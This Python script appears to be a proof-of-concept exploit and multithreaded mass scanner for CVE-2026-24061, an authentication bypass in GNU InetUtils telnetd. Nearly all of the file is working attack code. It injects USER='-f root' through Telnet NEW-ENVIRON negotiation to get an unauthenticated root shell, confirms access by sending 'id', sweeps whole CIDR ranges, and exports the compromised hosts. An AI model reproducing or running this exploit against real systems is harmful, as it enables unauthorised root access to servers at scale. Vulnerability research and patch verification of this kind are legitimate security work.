#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
cve_2026_24061.py - CVE-2026-24061 GNU InetUtils telnetd Authentication Bypass

CVE:        CVE-2026-24061
Severity:   Critical (CVSS 9.8)
Component:  GNU InetUtils telnetd
Type:       Unauthenticated remote authentication bypass leading to root shell

Description
-----------
GNU InetUtils telnetd fails to sanitize client-supplied environment variables
received via the Telnet NEW-ENVIRON option (RFC 1572). By injecting the USER
environment variable with the value "-f root" during the Telnet protocol
handshake, an unauthenticated attacker can cause telnetd to invoke:

    login -f root

The login(1) binary interprets "-f" as a pre-authentication (force login) flag,
granting a root shell without any credential verification.

Protocol Flow
-------------
1. Server: IAC DO NEW-ENVIRON       (server requests env vars from client)
2. Client: IAC WILL NEW-ENVIRON     (client agrees to send)
3. Server: IAC SB NEW-ENVIRON SEND IAC SE
4. Client: IAC SB NEW-ENVIRON IS VAR "USER" VALUE "-f root" IAC SE  [PAYLOAD]
5. Server spawns: login -f root     --> root shell granted

Usage
-----
    Single host:    python3 cve_2026_24061.py -t 192.168.1.1
    CIDR range:     python3 cve_2026_24061.py -t 10.0.0.0/24 -T 50
    File input:     python3 cve_2026_24061.py -f targets.txt -o results.csv
    JSON export:    python3 cve_2026_24061.py -t 10.0.0.0/24 --json results.json
    Custom user:    python3 cve_2026_24061.py -t 192.168.1.1 --user admin

Requirements
------------
    Python 3 (standard library only, zero external dependencies)

MITRE ATT&CK
-------------
    T1190  - Exploit Public-Facing Application
    T1059  - Command and Scripting Interpreter
    T1078  - Valid Accounts
    T1548  - Abuse Elevation Control Mechanism

Author:     franckferman
License:    AGPL-3.0
"""

import argparse
import concurrent.futures
import ipaddress
import json
import os
import socket
import sys
import threading
import time
from collections import Counter
from enum import Enum
from typing import Tuple, Optional, List, Dict


# ==============================================================================
# ANSI colors (no external dependency)
# ==============================================================================
class C:
    """ANSI escape sequences for terminal color output."""
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    DIM = "\033[2m"
    BOLD = "\033[1m"
    RST = "\033[0m"

    @classmethod
    def disable(cls):
        """Disable colors for non-TTY output or --no-color flag."""
        for attr in ("RED", "GREEN", "YELLOW", "BLUE", "CYAN", "DIM", "BOLD", "RST"):
            setattr(cls, attr, "")


BANNER = f"""
{C.RED}    CVE-2026-24061{C.RST} - GNU InetUtils telnetd Authentication Bypass
    Telnet NEW-ENVIRON USER="-f root" Injection Scanner
{C.DIM}    Zero-dependency Python PoC{C.RST}
"""


# ==============================================================================
# Telnet Protocol Constants (RFC 854, RFC 1572)
# ==============================================================================
IAC  = b'\xff'  # Interpret As Command
DONT = b'\xfe'
DO   = b'\xfd'
WONT = b'\xfc'
WILL = b'\xfb'
SB   = b'\xfa'  # Sub-negotiation Begin
SE   = b'\xf0'  # Sub-negotiation End

OPT_NEW_ENVIRON = b'\x27'  # Option 39 - RFC 1572

IS    = b'\x00'
SEND  = b'\x01'
VAR   = b'\x00'
VALUE = b'\x01'


class Status(Enum):
    """Result status for a single exploit attempt."""
    VULNERABLE = "VULNERABLE"
    SAFE = "SAFE"
    ERROR = "ERROR"
    CLOSED = "CLOSED"


# ==============================================================================
# EXPLOIT CORE
# ==============================================================================
class TelnetExploiter:
    """
    Implements CVE-2026-24061 against a single target.

    Performs the full Telnet NEW-ENVIRON negotiation over a raw TCP socket,
    injecting USER=<payload> as the environment variable. Determines
    vulnerability based on the server response.

    Attributes
    ----------
    target : str
        IP address or hostname.
    port : int
        TCP port (default: 23).
    timeout : int
        Socket timeout in seconds (default: 5).
    user : str
        Username payload for the -f flag (default: "root").
    """

    def __init__(self, target: str, port: int = 23, timeout: int = 5, user: str = "root"):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.user = user
        self.sock: Optional[socket.socket] = None
        self.buffer = b""

    def connect(self) -> bool:
        """Open a TCP connection to the target."""
        try:
            self.sock = socket.create_connection(
                (self.target, self.port), timeout=self.timeout
            )
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    def close(self):
        """Close the TCP socket."""
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass

    def _build_payload(self) -> bytes:
        """
        Construct the malicious NEW-ENVIRON IS sub-negotiation payload.

        Returns the full IAC SB ... IAC SE sequence that injects:
            VAR "USER" VALUE "-f <user>"
        """
        return (
            IAC + SB + OPT_NEW_ENVIRON + IS
            + VAR + b"USER"
            + VALUE + f"-f {self.user}".encode()
            + IAC + SE
        )

    def run(self) -> Tuple[Status, Optional[str]]:
        """
        Execute the exploit sequence.

        Returns
        -------
        Tuple[Status, Optional[str]]
            (status, evidence_or_error_message)
        """
        if not self.connect():
            return Status.CLOSED, "Connection failed or port closed"

        try:
            payload_injected = False
            start_time = time.time()

            while time.time() - start_time < self.timeout:
                try:
                    data = self.sock.recv(1024)
                    if not data:
                        break

                    self.buffer += data
                    i = 0

                    while i < len(data) - 2:
                        if data[i:i+1] != IAC:
                            i += 1
                            continue

                        cmd = data[i+1:i+2]
                        opt = data[i+2:i+3]

                        if cmd == DO and opt == OPT_NEW_ENVIRON:
                            self.sock.sendall(IAC + WILL + OPT_NEW_ENVIRON)

                        elif cmd == SB and opt == OPT_NEW_ENVIRON:
                            se_idx = data.find(IAC + SE, i)
                            if se_idx != -1:
                                sub_content = data[i+3:se_idx]
                                if sub_content.startswith(SEND):
                                    self.sock.sendall(self._build_payload())
                                    payload_injected = True

                        elif cmd == DO:
                            self.sock.sendall(IAC + WONT + opt)

                        elif cmd == WILL:
                            self.sock.sendall(IAC + DONT + opt)

                        i += 3

                    # Check response for root shell indicators
                    decoded = self.buffer.decode(errors='ignore')
                    if self._check_success(decoded):
                        return Status.VULNERABLE, decoded

                except socket.timeout:
                    break

            # Secondary confirmation: send `id` command if payload was injected
            if payload_injected:
                try:
                    self.sock.sendall(b"id\n")
                    time.sleep(0.5)
                    resp = self.sock.recv(1024).decode(errors='ignore')
                    if f"uid=0({self.user})" in resp or "uid=0(root)" in resp:
                        return Status.VULNERABLE, resp
                except (socket.timeout, OSError):
                    pass

            return Status.SAFE, "Authentication required or payload ignored"

        except Exception as exc:
            return Status.ERROR, str(exc)
        finally:
            self.close()

    @staticmethod
    def _check_success(response: str) -> bool:
        """
        Determine if the response indicates a successful root login.

        Checks for uid=0 or shell prompt (#) while ruling out
        authentication failure messages.
        """
        if "Login incorrect" in response or "Password:" in response:
            return False
        if "uid=0(root)" in response:
            return True
        if response.rstrip().endswith("#"):
            return True
        return False


# ==============================================================================
# NETWORK UTILITIES (stdlib only - replaces netaddr)
# ==============================================================================
def expand_targets(raw_targets: List[str], default_port: int) -> List[Tuple[str, int]]:
    """
    Expand a list of target strings into (ip, port) tuples.

    Supported formats:
        - Single IP:      192.168.1.1
        - IP:port:        192.168.1.1:2323
        - CIDR:           10.0.0.0/24
        - Hostname:       telnet.example.com

    Args:
        raw_targets: List of raw target strings.
        default_port: Default port when not specified.

    Returns:
        List of (ip_string, port) tuples.
    """
    results: List[Tuple[str, int]] = []

    for t in raw_targets:
        t = t.strip()
        if not t:
            continue

        port = default_port

        # Handle IP:port notation
        if ':' in t and '/' not in t:
            parts = t.rsplit(':', 1)
            try:
                port = int(parts[1])
                t = parts[0]
            except ValueError:
                pass

        # Handle CIDR
        if '/' in t:
            try:
                network = ipaddress.ip_network(t, strict=False)
                for ip in network.hosts():
                    results.append((str(ip), port))
            except ValueError:
                print(f"{C.RED}[!] Invalid CIDR: {t}{C.RST}", file=sys.stderr)
        else:
            results.append((t, port))

    return results


# ==============================================================================
# SCANNER
# ==============================================================================
class Scanner:
    """
    Multithreaded scanner driving TelnetExploiter across a target list.

    Attributes
    ----------
    targets : List[Tuple[str, int]]
        Expanded (ip, port) tuples.
    threads : int
        Concurrent worker count.
    timeout : int
        Per-host socket timeout.
    user : str
        Username for the -f payload.
    csv_path : Optional[str]
        CSV output file path.
    json_path : Optional[str]
        JSON output file path.
    """

    def __init__(
        self,
        targets: List[Tuple[str, int]],
        threads: int = 10,
        timeout: int = 5,
        user: str = "root",
        csv_path: Optional[str] = None,
        json_path: Optional[str] = None,
        verbose: bool = True,
    ):
        self.targets = targets
        self.threads = threads
        self.timeout = timeout
        self.user = user
        self.csv_path = csv_path
        self.json_path = json_path
        self.verbose = verbose
        self.lock = threading.Lock()
        self.stats: Counter = Counter()
        self.results: List[Dict] = []

    def _log(self, ip: str, port: int, status: Status, message: str):
        """Thread-safe result logging."""
        with self.lock:
            self.stats[status] += 1
            self.results.append({
                "target": f"{ip}:{port}",
                "status": status.value,
                "message": message.strip()[:200],
            })

            if not self.verbose:
                if status == Status.VULNERABLE:
                    print(f"{ip}:{port}")
                return

            label = f"{ip}:{port}"
            if status == Status.VULNERABLE:
                print(f"{C.GREEN}[VULN]{C.RST} {label} : ROOT SHELL ACCESSED!")
                proof = message.strip()[:100]
                if proof:
                    print(f"       {C.DIM}-> {proof}{C.RST}")
            elif status == Status.SAFE:
                print(f"{C.YELLOW}[SAFE]{C.RST} {label} : {message}")
            elif status == Status.ERROR:
                print(f"{C.RED}[ERR ]{C.RST} {label} : {message}")
            elif status == Status.CLOSED:
                print(f"{C.DIM}[CLOS]{C.RST} {label} : {message}")

    def _scan_one(self, entry: Tuple[str, int]):
        """Scan a single target."""
        ip, port = entry
        exploiter = TelnetExploiter(ip, port=port, timeout=self.timeout, user=self.user)
        status, msg = exploiter.run()
        self._log(ip, port, status, msg or "")

    def run(self):
        """Execute the scan across all targets."""
        if self.verbose:
            print(f"{C.BLUE}[*]{C.RST} Scanning {len(self.targets)} target(s) "
                  f"with {self.threads} thread(s), user={self.user}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as pool:
            pool.map(self._scan_one, self.targets)

        if self.verbose:
            total = sum(self.stats.values())
            print(f"\n{C.BLUE}[*]{C.RST} Scan complete.")
            print(f"    Total:      {total}")
            print(f"    Vulnerable: {C.GREEN}{self.stats[Status.VULNERABLE]}{C.RST}")
            print(f"    Safe:       {self.stats[Status.SAFE]}")
            print(f"    Closed/Err: {self.stats[Status.CLOSED] + self.stats[Status.ERROR]}")

        # Export
        if self.csv_path:
            self._export_csv()
        if self.json_path:
            self._export_json()

    def _export_csv(self):
        """Write results to CSV."""
        with open(self.csv_path, 'w', encoding='utf-8') as fh:
            fh.write("target,status,message\n")
            for r in self.results:
                msg = r['message'].replace('"', '""')
                fh.write(f"{r['target']},{r['status']},\"{msg}\"\n")
        if self.verbose:
            print(f"{C.BLUE}[+]{C.RST} CSV exported to '{self.csv_path}'")

    def _export_json(self):
        """Write results to JSON."""
        with open(self.json_path, 'w', encoding='utf-8') as fh:
            json.dump(self.results, fh, indent=2, ensure_ascii=False)
        if self.verbose:
            print(f"{C.BLUE}[+]{C.RST} JSON exported to '{self.json_path}'")


# ==============================================================================
# CLI
# ==============================================================================
def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        prog="cve_2026_24061",
        description=(
            "CVE-2026-24061 - GNU InetUtils telnetd Authentication Bypass Scanner.\n"
            "Exploits NEW-ENVIRON USER=\"-f root\" injection to obtain unauthenticated root shell."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 cve_2026_24061.py -t 192.168.1.1\n"
            "  python3 cve_2026_24061.py -t 10.0.0.0/24 -T 50\n"
            "  python3 cve_2026_24061.py -f targets.txt -o results.csv\n"
            "  python3 cve_2026_24061.py -t 10.0.0.0/24 --json report.json\n"
            "  python3 cve_2026_24061.py -t 192.168.1.1 --user admin\n\n"
            "MITRE ATT&CK: T1190, T1059, T1078, T1548\n"
            "CVSS 3.1: 9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
        ),
    )
    source = parser.add_mutually_exclusive_group(required=True)
    source.add_argument("-t", "--target", help="Single IP, hostname, or CIDR range (e.g. 10.0.0.0/24)")
    source.add_argument("-f", "--file", help="File containing IPs/CIDRs (one per line)")

    parser.add_argument("-T", "--threads", type=int, default=10,
                        help="Concurrent threads (default: 10)")
    parser.add_argument("-p", "--port", type=int, default=23,
                        help="Target port (default: 23)")
    parser.add_argument("--timeout", type=int, default=5,
                        help="Socket timeout in seconds (default: 5)")
    parser.add_argument("--user", default="root",
                        help="Username for -f payload (default: root)")
    parser.add_argument("-o", "--output", metavar="CSV",
                        help="Export results to CSV file")
    parser.add_argument("--json", metavar="FILE",
                        help="Export results to JSON file")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Quiet mode: only print vulnerable targets (one per line)")
    parser.add_argument("--no-color", action="store_true",
                        help="Disable ANSI color output")
    return parser.parse_args()


def main():
    """Entry point."""
    args = parse_args()

    if args.no_color or not sys.stdout.isatty():
        C.disable()

    if not args.quiet:
        print(BANNER)

    # Load targets
    raw: List[str] = []
    if args.target:
        raw.append(args.target)
    else:
        if not os.path.exists(args.file):
            print(f"{C.RED}[!] File not found: {args.file}{C.RST}", file=sys.stderr)
            sys.exit(1)
        with open(args.file, 'r', encoding='utf-8') as fh:
            raw = [line.strip() for line in fh if line.strip() and not line.startswith('#')]

    targets = expand_targets(raw, args.port)

    if not targets:
        print(f"{C.RED}[!] No valid targets.{C.RST}", file=sys.stderr)
        sys.exit(1)

    scanner = Scanner(
        targets=targets,
        threads=args.threads,
        timeout=args.timeout,
        user=args.user,
        csv_path=args.output,
        json_path=args.json,
        verbose=not args.quiet,
    )
    scanner.run()


if __name__ == "__main__":
    main()
